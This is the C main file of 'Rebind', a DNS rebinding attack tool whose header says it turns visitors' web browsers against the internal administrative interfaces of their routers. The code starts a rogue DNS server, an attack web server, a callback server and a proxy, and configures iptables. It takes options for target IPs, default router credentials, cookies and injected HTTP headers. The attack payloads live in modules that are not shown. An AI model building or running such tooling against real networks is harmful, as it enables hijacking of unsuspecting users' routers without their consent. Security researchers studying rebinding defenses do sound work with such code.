/* Rebind is a tool for performing DNS rebinding by returning multiple A records for DNS lookups.
 * Specifically, it is designed to use client's Web browsers to attack the internal Web interfaces
 * of routers that allow internal clients to reference the router's administrative interface via the
 * router's public IP address.
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <wait.h>
#include <signal.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "common.h"
#include "socklib.h"
#include "iptables.h"
#include "sql.h"
#include "dns.h"
#include "attack.h"
#include "callback.h"
#include "proxy.h"
#include "fifo.h"
#include "filter.h"
#include "html.h"
#include "console.h"
#include "config.h"
#include "rebind.h"

int main(int argc, char *argv[])
{
	char *target_ips = NULL, *fqdn = NULL, *attack_port = NULL, *callback_port = NULL, *iface_ip = NULL;
	int c = 0, status = 0, error = 0;
	struct sigaction sa_new;
	struct sigaction sa_old;

	memset((void *) &sa_new,0,sizeof(struct sigaction));
	memset((void *) &sa_old,0,sizeof(struct sigaction));
	memset((void *) &globals,0,sizeof(struct global_variables));

	/* Initialize sqlite database */
        if(sql_init() != SQLITE_OK){
                fprintf(stderr,"Failed to initialize sqlite database! Quitting...\n");
                cleanup();
                return EXIT_FAILURE;
        }

	/* Initialize some default configuration values */
	config_set_attack_port(DEFAULT_ATTACK_PORT);
	config_set_callback_port(DEFAULT_CALLBACK_PORT);
        config_set_user(DEFAULT_USER);
        config_set_pass(DEFAULT_PASS);
	config_set_path(DEFAULT_PATH);
	config_set_interval(DEFAULT_INTERVAL);
	config_set_cookie("");

	/* Save parent PID; this is the only PID that is allowed to perform cleanup operations (see cleanup() function) */
	globals.parent_pid = getpid();

	/* Prevent defunct child processes */
	signal(SIGCHLD,SIG_IGN);
	
	/* Set up a SIGINT handler to clean up after ourselves when Ctl+C is hit */
	sa_new.sa_handler = sigint_handler;
	sigemptyset(&sa_new.sa_mask);
	sa_new.sa_flags = 0;
	sigaction(SIGINT,&sa_new,&sa_old);
	
	/* Parse command line options */
	opterr = 0;
	while((c = getopt(argc,argv,"i:d:p:t:u:a:r:n:c:C:H:h")) != -1){	
		switch(c){
			case 'i':
				iface_ip = get_interface_ip(optarg);
				config_set_server_ip(iface_ip);
				if(iface_ip) free(iface_ip);
				break;
			case 'd':
				config_set_fqdn(optarg);
				break;
			case 'p':
				config_set_attack_port(optarg);
				break;
			case 't':
				target_ips = strdup(optarg);
				break;
			case 'u':
				config_set_user(optarg);
				break;
			case 'a':
				config_set_pass(optarg);
				break;
			case 'r':
				config_set_path(optarg);
				break;
			case 'n':
				config_set_interval(optarg);
				break;
			case 'c':
				config_set_callback_port(optarg);
				break;
			case 'C':
				config_set_cookie(optarg);
				break;
			case 'H':
				parse_headers_file(optarg);
				break;
			default:
				usage(argv[0]);
				return EXIT_FAILURE;
		}
	}

	/* Get the run-time settings to print them out to the user later */
	fqdn = config_get_fqdn();
	iface_ip = config_get_server_ip();
	attack_port = config_get_attack_port();
	callback_port = config_get_callback_port();

	/* Double-check usage */
	if((fqdn == NULL) || (iface_ip == NULL)){
		usage(argv[0]);
		cleanup();
		return EXIT_FAILURE;
	}

	/* Check permissions */
	if(getuid() != ROOT){
		fprintf(stderr,"I need to be run as root!\n");
		cleanup();
		return EXIT_FAILURE;
	}

	/* Check to make sure that IPTABLES is installed and available in $PATH */
	if(!which(IPTABLES)){
		fprintf(stderr,"Failed to locate '%s'; make sure that it is installed and located in $PATH!\n",IPTABLES);
		cleanup();
		return EXIT_FAILURE;
	}

	/* Initialize the targets table */
	if(target_ips != NULL){
		if(!parse_target_ips(target_ips)){
			fprintf(stderr,"Failed to initialize target list! Quitting...\n");
			cleanup();
			return EXIT_FAILURE;
		}
		free(target_ips);
	}

	/* Initialize iptables chain */
	if(iptables_init() == IPTABLES_FAIL){
		fprintf(stderr,"Failed to initialize iptables chain! Quitting...\n");
		cleanup();
		return EXIT_FAILURE;
	}

	/* Start DNS server */
	printf("\n%s Starting DNS server on port %d\n",MESSAGE_LINE,DNS_PORT);
	globals.dns_pid = fork();
	if(globals.dns_pid < 0){
		perror("Fork Failure");
		cleanup();
		return EXIT_FAILURE;
	} else if(globals.dns_pid == 0){
		serve_dns();
		return EXIT_FAILURE;
	}

	/* Run the attack Web server */
	printf("%s Starting attack Web server on port %s\n",MESSAGE_LINE, attack_port);
	globals.attack_pid = fork();
	if(globals.attack_pid < 0){
		perror("Fork failure");
		cleanup();
		return EXIT_FAILURE;
	} else if(globals.attack_pid == 0){
		attack_web_server();
		return EXIT_FAILURE;
	}

	/* Fire up the callback Web server */
	printf("%s Starting callback Web server on port %s\n",MESSAGE_LINE,callback_port);
	globals.callback_pid = fork();
	if(globals.callback_pid < 0){
                perror("Fork failure");
		cleanup();
                return EXIT_FAILURE;
        } else if(globals.callback_pid == 0){
		callback_server();
		return EXIT_FAILURE;
	}

	/* Start the proxy server */
	printf("%s Starting proxy server on %s:%d\n",MESSAGE_LINE,iface_ip,PROXY_PORT);
	globals.proxy_pid = fork();
	if(globals.proxy_pid < 0){
                perror("Fork failure");
		cleanup();
                return EXIT_FAILURE;
        } else if(globals.proxy_pid == 0){
		proxy_server();
		return EXIT_FAILURE;
	}

	/* Wait for child processes to start up, then check for errors */
	sleep(1);

	if(!process_exists(globals.dns_pid)){
		printf("%s Failed to start DNS server on UDP port %d!\n",ERROR_LINE,DNS_PORT);
		error = 1;
	} else {
		/* Set all child process group IDs equal to their process IDs. This way when we exit they
		 * can be killed off by group ID and we're sure to get all of their child processes, if any.
		 */
		setpgid(globals.dns_pid,0);
	}

	if(!process_exists(globals.attack_pid)){
		printf("%s Failed to start attack server on TCP port %s!\n",ERROR_LINE,attack_port);
		error = 1;
	} else {
		setpgid(globals.attack_pid,0);
	}

	if(!process_exists(globals.callback_pid)){
		printf("%s Failed to start callback server on TCP port %s!\n",ERROR_LINE,callback_port);
		error = 1;
        } else {
                setpgid(globals.callback_pid,0);
        }

	if(!process_exists(globals.proxy_pid)){
		printf("%s Failed to start proxy server on TCP port %d!\n",ERROR_LINE,PROXY_PORT);
		error = 1;
        } else {
                setpgid(globals.proxy_pid,0);
        }

	if(error){
		show_errors(0,NULL);
		cleanup();
		return EXIT_FAILURE;
	}

	/* Ignore image requests by adding common image file extensions to the filter list */
        filter_ext(ICO);
	filter_ext(GIF);
	filter_ext(JPG);
	filter_ext(PNG);
	filter_ext(BMP);

	printf("%s Services started and running!\n\n",MESSAGE_LINE);

	/* Start up the command-line console */
	globals.console_pid = fork();
	if(globals.console_pid < 0){
		perror("Fork failure");
		return EXIT_FAILURE;
	} else if(globals.console_pid == 0){
		console();
		return EXIT_FAILURE;
	}

	/* Wait for a child to return. None of them should, so if one does, then we need to cleanup and exit */
	wait(&status);

	if(fqdn) free(fqdn);
	if(callback_port) free(callback_port);
	if(attack_port) free(attack_port);
	if(iface_ip) free(iface_ip);

	cleanup();
	return EXIT_FAILURE;
}

/* Parses a comma-separated list of target IP addresses and inserts them into the targets table */
int parse_target_ips(char *comma_separated_list)
{
	char *sql = NULL, *ip_list = NULL, *ip = NULL;
	int i = 0, ip_list_len = 0, err_code = 0, result_size = 0;

	ip_list = strdup(comma_separated_list);
	if(!ip_list){
		perror("strdup failure");
		return 0;
	}
	ip_list_len = strlen(ip_list);
	ip = ip_list;

	for(i=0; i<=ip_list_len; i++){

		switch(ip_list[i])
		{
			case ',':
				/* NULL out the period */
				memset(ip_list+i,0,1);
	
			case '\0':
				/* Insert the ip address into the database */
				sql = sqlite3_mprintf("INSERT INTO %s (ip,count) VALUES (%Q,0)", TARGETS_TABLE, ip);
				sql_exec(sql,&result_size,&err_code);
				sqlite3_free(sql);
				if(err_code != SQLITE_OK){
					sql_log_error();
					if(ip_list) free(ip_list);
					return 0;
				}

				/* If we haven't reached the end of the comma separated list, point ip
				 * one character beyond the previously NULLed comma.
				 */
				if(i < ip_list_len){
					ip = (ip_list+i+1);
				}

			default:
				break;
		}
	}

	if(ip_list) free(ip_list);
	return 1;
}

/* Parse the headers file provided on the command line and add each line as a new HTTP header in the headers table */
int parse_headers_file(char *file_name)
{
	char *buffer = NULL, *header = NULL, *sql = NULL;
	struct stat file_stat;
	FILE *fp = NULL;
	int i = 0, result_size = 0, err_code = 0;

	memset(&file_stat,0,sizeof(struct stat));

	if(stat(file_name,&file_stat) == 0){
		fp = fopen(file_name,"r");
		if(fp){
			buffer = malloc(file_stat.st_size);
			if(!buffer){
				perror("Malloc failure");
				fclose(fp);
				return 0;
			}

			if(fread(buffer,1,file_stat.st_size,fp) == (size_t) file_stat.st_size){
	
				/* Point header at the beginning of the file contents */	
				header = buffer;
	
				for(i=0; i<file_stat.st_size; i++){

					/* Find and null out new line and carrige return characters as they delineate a new line
					 * and subsequently a new header.
					 */
					if(buffer[i] == '\r' || buffer[i] == '\n'){

						memset(buffer+i,0,1);
					
						/* If we have a header, add it to the headers database */
						if(strlen(header) > 0){
							sql = sqlite3_mprintf("INSERT INTO %s (header) VALUES (%Q)",HEADERS_TABLE,header);
							sql_exec(sql,&result_size,&err_code);
							if(err_code != SQLITE_OK){
								sql_log_error();
							}
							sqlite3_free(sql);
						}

						/* Point header one byte beyond the now nulled byte */
						header = buffer+i+1;
					}
				}
			}
		}
        }

	return 1;
}

/* Returns 1 if file is in an $PATH directory; returns 0 if it is not */
int which(char *file)
{
        char *path = NULL, *full_path = NULL;
        int path_size = 0, ret_val = 0, i = 0, j = 0;
        char dir[MAX_PATH_SIZE] = { 0 };
	struct stat file_stat;

        path = getenv(PATH);
        path_size = strlen(path);

        for(i=0;i<path_size && ret_val == 0;i++){

                for(j=0;i < path_size && j < MAX_PATH_SIZE && path[i] != COLON;j++,i++){
                        dir[j] = path[i];
                }

		full_path = sqlite3_mprintf("%s/%s",dir,file);
		if(stat(full_path,&file_stat) == 0){
			ret_val = 1;
		}

		sqlite3_free(full_path);
                memset((void *) &dir,0,MAX_PATH_SIZE);
        }

        return ret_val;
}

/* Check to make sure a given PID is listed in the /proc directory */
int process_exists(int pid)
{
        char *dir = sqlite3_mprintf("%s/%d",PROC_DIR,pid);
        int ret_val = 0;
        struct stat dir_stat;

        if(stat(dir,&dir_stat) == 0){
                ret_val = 1;
        }

        sqlite3_free(dir);
        return ret_val;
}

/* Display usage */
void usage(char *prog_name)
{
	fprintf(stderr,"\n");
	fprintf(stderr,"Rebind v%s\n\n",VERSION);
	fprintf(stderr,"Usage: %s [OPTIONS]\n\n",prog_name);
	fprintf(stderr,"\t-i <interface>\tSpecify the network interface to bind to\n");
	fprintf(stderr,"\t-d <fqdn>     \tSpecify your registered domain name\n");
	fprintf(stderr,"\t-u <user>     \tSpecify the Basic Authentication user name [%s]\n",DEFAULT_USER);
	fprintf(stderr,"\t-a <pass>     \tSpecify the Basic Authentication password [%s]\n",DEFAULT_PASS);
	fprintf(stderr,"\t-r <path>     \tSpecify the initial URL request path [%s]\n",DEFAULT_PATH);
	fprintf(stderr,"\t-t <ip>       \tSpecify a comma separated list of target IP addresses [client IP]\n");
	fprintf(stderr,"\t-n <time>     \tSpecify the callback interval in milliseconds [%s]\n",DEFAULT_INTERVAL);
	fprintf(stderr,"\t-p <port>     \tSpecify the target port [%s]\n",DEFAULT_ATTACK_PORT);
	fprintf(stderr,"\t-c <port>     \tSpecify the callback port [%s]\n",DEFAULT_CALLBACK_PORT);
	fprintf(stderr,"\t-C <value>    \tSpecify a cookie to set for the client\n");
	fprintf(stderr,"\t-H <file>     \tSpecify a file of HTTP headers for the client to send to the target\n");
	fprintf(stderr,"\n");
	return;
}

/* Handles SIGINTs to make sure cleanup() gets called when the program exits */
static void sigint_handler(int signum)
{
	cleanup();
	signum = 0;
	exit(EXIT_FAILURE);
}

/* Clean up the system before exiting */
void cleanup()
{
	/* Only the main parent should perform cleanup */
	if(getpid() == globals.parent_pid){
		fifo_cleanup();
		sql_cleanup();
		iptables_destroy();
	
		if(globals.attack_pid > 0) killpg(globals.attack_pid,SIGKILL);
		if(globals.callback_pid > 0) killpg(globals.callback_pid,SIGKILL);
		if(globals.proxy_pid > 0) killpg(globals.proxy_pid,SIGKILL);
		if(globals.dns_pid > 0) killpg(globals.dns_pid,SIGKILL);
		if(globals.console_pid > 0) killpg(globals.console_pid,SIGKILL);

		printf("\n");
	}
}
